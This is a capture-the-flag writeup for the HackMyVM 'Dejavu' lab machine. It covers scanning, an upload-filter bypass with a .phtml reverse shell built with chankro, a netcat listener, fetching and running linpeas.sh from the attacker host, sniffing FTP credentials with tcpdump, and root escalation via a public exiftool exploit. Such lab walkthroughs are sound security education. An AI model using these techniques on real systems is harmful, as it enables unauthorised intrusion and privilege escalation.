---
title: HackMyVM:Dejavu - Writeup
author: Elman Alizadeh
date: 2022-06-21 16:50:00 +0800
categories: [ctf, HackMyVM]
tags: [hackmyvm, dejavu]
---

Today we will take a look at HackMyVM: Dejavu. My goal in sharing this writeup is to show you the way if you are in trouble. Please try to understand each step and take notes.

![Desktop View]({{ "/assets/img/hmv-dejavu/1.png" | relative_url }})

## Nmap

```console
──(al1z4deh㉿kali)-[~/ctf/hmv/dejavu]
└─$ sudo nmap -p- -sCV --open -oN nmap/open 192.168.0.110

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:8f:5b:43:62:a1:5b:41:6d:7b:6e:55:27:bd:e1:67 (RSA)
|   256 10:17:d6:76:95:d0:9c:cc:ad:6f:20:7d:33:4a:27:4c (ECDSA)
|_  256 12:72:23:de:ef:28:28:9e:e0:12:ae:5f:37:2e:ee:25 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 3C:A0:67:C5:35:33 (Liteon Technology)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Gobuster

```console
──(al1z4deh㉿kali)-[~/ctf/hmv/dejavu]
└─$ gobuster dir -u http://192.168.0.110 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt               
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.110
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
2022/06/21 15:18:12 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/info.php             (Status: 200) [Size: 69964]
```

## Web

When we look at the /info.php page, we can see that it is a simple php page, but when we look at the source code, we see the tip given to us

view-source:http://192.168.0.110/info.php

![Desktop View]({{ "/assets/img/hmv-dejavu/2.png" | relative_url }})

http://192.168.0.110/S3cR3t/

Could not upload webshell to /upload.php

![Desktop View]({{ "/assets/img/hmv-dejavu/3.png" | relative_url }})

Accordingly, I am looking for an extension that I can bypass with burpsuite

![Desktop View]({{ "/assets/img/hmv-dejavu/4.png" | relative_url }})

I got the wordlist for the extension here.

[Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/extensions-most-common.fuzz.txt)

![Desktop View]({{ "/assets/img/hmv-dejavu/5.png" | relative_url }})

That’s what we found. I use this tool to get the reverse shell using the .phtml extension

[Tool](https://github.com/kriss-u/chankro-py3)

```console
└─$ git clone https://github.com/kriss-u/chankro-py3.git

└─$ cd chankro-py3

└─$ nano rev.sh
# Change ip and port

$ python3 chankro.py --arch 64 --input rev.sh --output shell.phtml --path /var/www/html/.HowToEliminateTheTenMostCriticalInternetSecurityThreats

-=[ Chankro ]=-
    -={ @TheXC3LL }=-

[+] Binary file: rev.sh
[+] Architecture: x64
[+] Final PHP: shell.phtml

[+] File created!
```

Here is the file uploaded, let’s listen

http://192.168.0.110/S3cR3t/files/shell.phtml

## robert

```console
└─$ nc -nvlp 9001      
listening on [any] 9001 ...
connect to [192.168.0.108] from (UNKNOWN) [192.168.0.110] 47062
bash: cannot set terminal process group (771): Inappropriate ioctl for device
bash: no job control in this shell

<nMostCriticalInternetSecurityThreats/S3cR3t/files$ cd /tmp

www-data@dejavu:/tmp$ ls

www-data@dejavu:/tmp$ export TERM=xterm

www-data@dejavu:/tmp$ wget http://192.168.0.108/linpeas.sh

--2022-06-21 11:33:48--  http://192.168.0.108/linpeas.sh
Connecting to 192.168.0.108:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 660177 (645K) [text/x-sh]
Saving to: 'linpeas.sh'


     0K .......... .......... .......... .......... ..........  7%  212K 3s
    50K .......... .......... .......... .......... .......... 15%  838K 2s
   100K .......... .......... .......... .......... .......... 23% 1.12M 1s
   150K .......... .......... .......... .......... .......... 31%  823K 1s
   200K .......... .......... .......... .......... .......... 38%  695K 1s
   250K .......... .......... .......... .......... .......... 46% 1.50M 1s
   300K .......... .......... .......... .......... .......... 54%  835K 0s
   350K .......... .......... .......... .......... .......... 62% 2.92M 0s
   400K .......... .......... .......... .......... .......... 69% 1.01M 0s
   450K .......... .......... .......... .......... .......... 77%  850K 0s
   500K .......... .......... .......... .......... .......... 85%  346K 0s
   550K .......... .......... .......... .......... .......... 93%  170M 0s
   600K .......... .......... .......... .......... ....      100% 1.51M=0.9s

2022-06-21 11:33:49 (748 KB/s) - 'linpeas.sh' saved [660177/660177]

www-data@dejavu:/tmp$ chmod +x linpeas.sh

www-data@dejavu:/tmp$ ./linpeas.sh
```

I’m looking for something to use linpeas.sh

![Desktop View]({{ "/assets/img/hmv-dejavu/6.png" | relative_url }})

There is traffic inside the 21 ports, so we have the authority to listen to it

```console
www-data@dejavu:/tmp$ sudo -u robert tcpdump -i lo port 21
```

![Desktop View]({{ "/assets/img/hmv-dejavu/7.png" | relative_url }})

Let’s find the password and enter it with ssh

## Ssh

```console
└─$ ssh robert@192.168.0.110
```

## Root

```console
robert@dejavu:~$ sudo -l
Matching Defaults entries for robert on dejavu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on dejavu:
    (root) NOPASSWD: /usr/local/bin/exiftool
```

I found an exploit for exiftool

[Exiftool](https://www.exploit-db.com/exploits/50911)

I created an exploit.py file and add it. I tested

![Desktop View]({{ "/assets/img/hmv-dejavu/8.png" | relative_url }})

Here is the answer to us as root

Now let’s use this and change root password

![Desktop View]({{ "/assets/img/hmv-dejavu/9.png" | relative_url }})

Let’s root now

```console
robert@dejavu:~$ su root
```

![Desktop View]({{ "/assets/img/hmv-dejavu/10.png" | relative_url }})

### And now we are the root

![Desktop View]({{ "/assets/img/hmv-dejavu/1.gif" | relative_url }})

“If you have any questions or comments, please do not hesitate to write. Have a good days”
